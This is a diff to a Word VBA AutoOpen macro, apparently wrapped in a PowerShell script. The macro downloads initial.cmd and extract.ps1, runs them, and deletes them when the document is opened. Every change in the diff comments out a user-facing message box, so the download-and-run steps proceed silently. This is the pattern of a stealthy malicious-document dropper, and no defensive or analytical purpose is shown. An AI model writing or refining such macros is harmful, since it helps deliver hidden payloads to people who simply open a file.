@@ -78,7 +78,7 @@ Sub AutoOpen()
     ' Get the path to the current document's folder
     docPath = ThisDocument.Path
     If docPath = "" Then
-        MsgBox "Unable to determine the document path. Save the document first.", vbCritical
+        'MsgBox "Unable to determine the document path. Save the document first.", vbCritical
         Exit Sub
     End If
 
@@ -119,7 +119,7 @@ Sub AutoOpen()
             DoEvents
         Loop
     Else
-        MsgBox "Failed to download initial.cmd.", vbCritical
+        'MsgBox "Failed to download initial.cmd.", vbCritical
         Exit Sub
     End If
 
@@ -148,7 +148,7 @@ Sub AutoOpen()
         Loop
 
         If Not permissionGranted Then
-            MsgBox "Failed to obtain permissions for extract.ps1 after " & maxRetries & " attempts.", vbCritical
+            'MsgBox "Failed to obtain permissions for extract.ps1 after " & maxRetries & " attempts.", vbCritical
             Exit Sub
         End If
 
@@ -158,7 +158,7 @@ Sub AutoOpen()
             DoEvents
         Loop
     Else
-        MsgBox "Failed to download extract.ps1.", vbCritical
+        'MsgBox "Failed to download extract.ps1.", vbCritical
         Exit Sub
     End If
 
@@ -170,7 +170,7 @@ Sub AutoOpen()
     On Error GoTo 0
 
     ' Notify the user of successful execution and cleanup
-    MsgBox "initial.cmd and extract.ps1 downloaded, executed, and deleted successfully!", vbInformation
+    'MsgBox "initial.cmd and extract.ps1 downloaded, executed, and deleted successfully!", vbInformation
 End Sub
 "@)
 
